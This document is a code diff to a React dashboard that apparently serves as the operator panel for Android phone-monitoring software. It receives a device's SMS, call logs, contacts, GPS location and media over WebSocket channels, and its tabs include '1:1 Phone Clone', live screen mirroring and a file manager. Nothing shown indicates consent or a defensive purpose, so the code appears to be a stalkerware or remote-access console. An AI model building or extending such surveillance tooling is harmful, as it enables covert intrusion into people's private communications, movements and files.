@@ -20,13 +20,13 @@ function Dashboard({ token, onLogout }) {
   const [devices, setDevices] = useState(MOCK_DEVICES);
   const [activeDevice, setActiveDevice] = useState(MOCK_DEVICES[0]);
   const [liveConnected, setLiveConnected] = useState(false);
-  const [telemetry, setTelemetry] = useState({
-    smsList: [],
-    callLogs: [],
-    contacts: [],
-    location: null,
-    mediaList: []
-  });
+
+  // Separate state for each telemetry data type
+  const [liveSms, setLiveSms] = useState([]);
+  const [liveCallLogs, setLiveCallLogs] = useState([]);
+  const [liveContacts, setLiveContacts] = useState([]);
+  const [liveLocation, setLiveLocation] = useState(null);
+  const [liveMedia, setLiveMedia] = useState([]);
 
   useEffect(() => {
     // 1. Fetch saved devices from backend API if available
@@ -45,19 +45,19 @@ function Dashboard({ token, onLogout }) {
     };
     fetchRealDevices();
 
-    // 2. Connect WebSockets to live Render backend to receive real mobile telemetry
+    // 2. Connect WebSockets to live Render backend
     const socket = io(API_BASE_URL, {
       transports: ['websocket', 'polling']
     });
 
     socket.on('connect', () => {
-      console.log('Connected to backend WebSocket:', socket.id);
+      console.log('Dashboard connected to backend WebSocket:', socket.id);
       socket.emit('join_device', 'all');
     });
 
-    // Listen for live pings from the Android phone agent
+    // Device status pings (battery, network, storage, etc.)
     socket.on('device_status_update', (realData) => {
-      console.log('Real device telemetry received:', realData);
+      console.log('Device status update received:', realData);
       setLiveConnected(true);
 
       const liveDevice = {
@@ -66,40 +66,73 @@ function Dashboard({ token, onLogout }) {
         modelName: realData.modelName || realData.model || 'Android Device',
         osVersion: realData.osVersion || realData.os || 'Android 14',
         status: 'online',
-        batteryLevel: realData.batteryLevel !== undefined ? realData.batteryLevel : 88,
+        batteryLevel: realData.batteryLevel !== undefined ? realData.batteryLevel : 0,
         isCharging: realData.isCharging || false,
         storageUsed: realData.storageUsed || 0,
         storageTotal: realData.storageTotal || 0,
         networkType: realData.networkType || 'Mobile Data',
         ipAddress: realData.ip || 'Cloud Socket',
-        lastSeen: realData.lastSeen || 'Just now (Live)'
+        lastSeen: 'Just now (Live)'
       };
 
-      setDevices((prevDevices) => {
-        const realDevices = prevDevices.filter((d) => d.lastSeen && d.lastSeen.includes('Live'));
-        const index = realDevices.findIndex((d) => d._id === liveDevice._id);
-        if (index !== -1) {
+      setDevices((prev) => {
+        const realDevices = prev.filter((d) => d.lastSeen && d.lastSeen.includes('Live'));
+        const idx = realDevices.findIndex((d) => d._id === liveDevice._id);
+        if (idx !== -1) {
           const updated = [...realDevices];
-          updated[index] = liveDevice;
+          updated[idx] = liveDevice;
           return updated;
-        } else {
-          return [liveDevice, ...realDevices];
         }
+        return [liveDevice, ...realDevices];
       });
 
       setActiveDevice(liveDevice);
     });
 
-    // Listen for full telemetry dump (SMS, Call Logs, Contacts, Location, Media)
+    // ===== SEPARATE TELEMETRY CHANNELS =====
+    socket.on('live_sms_sync', (data) => {
+      console.log(`Live SMS sync received: ${data.count} messages`);
+      if (data.smsList && data.smsList.length > 0) {
+        setLiveSms(data.smsList);
+      }
+    });
+
+    socket.on('live_calls_sync', (data) => {
+      console.log(`Live Call logs sync received: ${data.count} logs`);
+      if (data.callLogs && data.callLogs.length > 0) {
+        setLiveCallLogs(data.callLogs);
+      }
+    });
+
+    socket.on('live_contacts_sync', (data) => {
+      console.log(`Live Contacts sync received: ${data.count} contacts`);
+      if (data.contacts && data.contacts.length > 0) {
+        setLiveContacts(data.contacts);
+      }
+    });
+
+    socket.on('live_location_sync', (data) => {
+      console.log(`Live Location sync received: ${data.latitude}, ${data.longitude}`);
+      if (data.latitude !== undefined) {
+        setLiveLocation(data);
+      }
+    });
+
+    socket.on('live_media_sync', (data) => {
+      console.log(`Live Media sync received: ${data.count} items`);
+      if (data.mediaList && data.mediaList.length > 0) {
+        setLiveMedia(data.mediaList);
+      }
+    });
+
+    // Legacy combined dump (fallback)
     socket.on('live_telemetry_dump', (dump) => {
-      console.log('Received full telemetry dump from device:', dump);
-      setTelemetry({
-        smsList: dump.smsList || [],
-        callLogs: dump.callLogs || [],
-        contacts: dump.contacts || [],
-        location: dump.location || null,
-        mediaList: dump.mediaList || []
-      });
+      console.log('Legacy telemetry dump received');
+      if (dump.smsList && dump.smsList.length > 0) setLiveSms(dump.smsList);
+      if (dump.callLogs && dump.callLogs.length > 0) setLiveCallLogs(dump.callLogs);
+      if (dump.contacts && dump.contacts.length > 0) setLiveContacts(dump.contacts);
+      if (dump.location) setLiveLocation(dump.location);
+      if (dump.mediaList && dump.mediaList.length > 0) setLiveMedia(dump.mediaList);
     });
 
     return () => {
@@ -189,98 +222,67 @@ function Dashboard({ token, onLogout }) {
       {/* Main Layout (Sidebar + Tab Content) */}
       <div className="dashboard-layout">
         <nav className="sidebar">
-          <button
-            className={`nav-tab ${activeTab === 'clone' ? 'active' : ''}`}
-            onClick={() => setActiveTab('clone')}
-          >
+          <button className={`nav-tab ${activeTab === 'clone' ? 'active' : ''}`} onClick={() => setActiveTab('clone')}>
             <i className="fa-solid fa-mobile"></i> 1:1 Phone Clone
           </button>
-          <button
-            className={`nav-tab ${activeTab === 'devices' ? 'active' : ''}`}
-            onClick={() => setActiveTab('devices')}
-          >
+          <button className={`nav-tab ${activeTab === 'devices' ? 'active' : ''}`} onClick={() => setActiveTab('devices')}>
             <i className="fa-solid fa-mobile-screen"></i> Devices Overview
           </button>
-          <button
-            className={`nav-tab ${activeTab === 'media' ? 'active' : ''}`}
-            onClick={() => setActiveTab('media')}
-          >
+          <button className={`nav-tab ${activeTab === 'media' ? 'active' : ''}`} onClick={() => setActiveTab('media')}>
             <i className="fa-solid fa-images"></i> Photos & Videos
+            {liveMedia.length > 0 && <span className="badge badge-online" style={{ marginLeft: '0.5rem', fontSize: '0.65rem' }}>{liveMedia.length}</span>}
           </button>
-          <button
-            className={`nav-tab ${activeTab === 'messages' ? 'active' : ''}`}
-            onClick={() => setActiveTab('messages')}
-          >
+          <button className={`nav-tab ${activeTab === 'messages' ? 'active' : ''}`} onClick={() => setActiveTab('messages')}>
             <i className="fa-solid fa-comments"></i> SMS & Messages
+            {liveSms.length > 0 && <span className="badge badge-online" style={{ marginLeft: '0.5rem', fontSize: '0.65rem' }}>{liveSms.length}</span>}
           </button>
-          <button
-            className={`nav-tab ${activeTab === 'calls' ? 'active' : ''}`}
-            onClick={() => setActiveTab('calls')}
-          >
+          <button className={`nav-tab ${activeTab === 'calls' ? 'active' : ''}`} onClick={() => setActiveTab('calls')}>
             <i className="fa-solid fa-phone-volume"></i> Call Logs
+            {liveCallLogs.length > 0 && <span className="badge badge-online" style={{ marginLeft: '0.5rem', fontSize: '0.65rem' }}>{liveCallLogs.length}</span>}
           </button>
-          <button
-            className={`nav-tab ${activeTab === 'contacts' ? 'active' : ''}`}
-            onClick={() => setActiveTab('contacts')}
-          >
+          <button className={`nav-tab ${activeTab === 'contacts' ? 'active' : ''}`} onClick={() => setActiveTab('contacts')}>
             <i className="fa-solid fa-address-book"></i> Contacts
+            {liveContacts.length > 0 && <span className="badge badge-online" style={{ marginLeft: '0.5rem', fontSize: '0.65rem' }}>{liveContacts.length}</span>}
           </button>
-          <button
-            className={`nav-tab ${activeTab === 'screen' ? 'active' : ''}`}
-            onClick={() => setActiveTab('screen')}
-          >
+          <button className={`nav-tab ${activeTab === 'screen' ? 'active' : ''}`} onClick={() => setActiveTab('screen')}>
             <i className="fa-solid fa-display"></i> Live Stream Mirror
           </button>
-          <button
-            className={`nav-tab ${activeTab === 'location' ? 'active' : ''}`}
-            onClick={() => setActiveTab('location')}
-          >
+          <button className={`nav-tab ${activeTab === 'location' ? 'active' : ''}`} onClick={() => setActiveTab('location')}>
             <i className="fa-solid fa-location-dot"></i> GPS Location
+            {liveLocation && <span className="badge badge-online" style={{ marginLeft: '0.5rem', fontSize: '0.65rem' }}>📍</span>}
           </button>
-          <button
-            className={`nav-tab ${activeTab === 'files' ? 'active' : ''}`}
-            onClick={() => setActiveTab('files')}
-          >
+          <button className={`nav-tab ${activeTab === 'files' ? 'active' : ''}`} onClick={() => setActiveTab('files')}>
             <i className="fa-solid fa-folder-open"></i> File Manager
           </button>
-          <button
-            className={`nav-tab ${activeTab === 'guide' ? 'active' : ''}`}
-            onClick={() => setActiveTab('guide')}
-          >
+          <button className={`nav-tab ${activeTab === 'guide' ? 'active' : ''}`} onClick={() => setActiveTab('guide')}>
             <i className="fa-solid fa-circle-info"></i> Setup Guide
           </button>
         </nav>
 
         <main className="main-content">
           {activeTab === 'clone' && (
-            <PhoneCloneView activeDevice={activeDevice} telemetry={telemetry} />
+            <PhoneCloneView activeDevice={activeDevice} telemetry={{ smsList: liveSms, callLogs: liveCallLogs, contacts: liveContacts, location: liveLocation, mediaList: liveMedia }} />
           )}
           {activeTab === 'devices' && (
-            <Devices
-              token={token}
-              activeDevice={activeDevice}
-              setActiveDevice={setActiveDevice}
-              devices={devices}
-              setDevices={setDevices}
-            />
+            <Devices token={token} activeDevice={activeDevice} setActiveDevice={setActiveDevice} devices={devices} setDevices={setDevices} />
           )}
           {activeTab === 'media' && (
-            <MediaViewer token={token} activeDevice={activeDevice} liveMedia={telemetry.mediaList} />
+            <MediaViewer token={token} activeDevice={activeDevice} liveMedia={liveMedia} />
           )}
           {activeTab === 'messages' && (
-            <MessagesViewer token={token} activeDevice={activeDevice} liveSms={telemetry.smsList} />
+            <MessagesViewer token={token} activeDevice={activeDevice} liveSms={liveSms} />
           )}
           {activeTab === 'calls' && (
-            <CallLogsViewer token={token} activeDevice={activeDevice} liveCallLogs={telemetry.callLogs} />
+            <CallLogsViewer token={token} activeDevice={activeDevice} liveCallLogs={liveCallLogs} />
           )}
           {activeTab === 'contacts' && (
-            <ContactsViewer token={token} activeDevice={activeDevice} liveContacts={telemetry.contacts} />
+            <ContactsViewer token={token} activeDevice={activeDevice} liveContacts={liveContacts} />
           )}
           {activeTab === 'screen' && (
             <ScreenMirror activeDevice={activeDevice} />
           )}
           {activeTab === 'location' && (
-            <LocationTracker token={token} activeDevice={activeDevice} liveLocation={telemetry.location} />
+            <LocationTracker token={token} activeDevice={activeDevice} liveLocation={liveLocation} />
           )}
           {activeTab === 'files' && (
             <FileManager token={token} activeDevice={activeDevice} />
